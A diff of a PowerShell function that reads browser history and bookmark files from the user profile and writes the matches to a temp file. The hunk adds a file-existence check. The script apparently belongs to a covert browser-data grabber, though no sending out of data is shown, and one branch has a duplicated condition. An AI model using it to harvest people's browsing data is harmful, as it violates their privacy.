@@ -18,18 +18,21 @@ function Get-BrowserData {
     elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
     elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
 
-    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-    $Value | ForEach-Object {
-        $Key = $_
-        if ($Key -match $Search){
-            New-Object -TypeName PSObject -Property @{
-                User = $env:UserName
-                Browser = $Browser
-                DataType = $DataType
-                Data = $_
+    if ( Test-Path -Path $Path )
+    {
+        $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+        $Value | ForEach-Object {
+            $Key = $_
+            if ($Key -match $Search){
+                New-Object -TypeName PSObject -Property @{
+                    User = $env:UserName
+                    Browser = $Browser
+                    DataType = $DataType
+                    Data = $_
+                }
             }
-        }
-    } 
+        } 
+    }
 }
 
 Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
